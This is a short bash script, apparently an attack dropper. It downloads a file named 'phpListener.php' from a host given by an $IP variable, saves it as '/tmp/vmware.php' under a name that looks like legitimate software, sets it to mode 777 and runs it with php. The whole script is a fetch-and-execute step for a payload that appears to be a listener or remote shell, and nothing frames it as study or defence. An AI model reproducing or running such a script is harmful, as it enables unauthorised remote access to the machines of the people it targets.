#!/bin/bash

#Download
wget $IP/payloads/phpListener.php -O /tmp/vmware.php

chmod 777 /tmp/vmware.php

php /tmp/vmware.php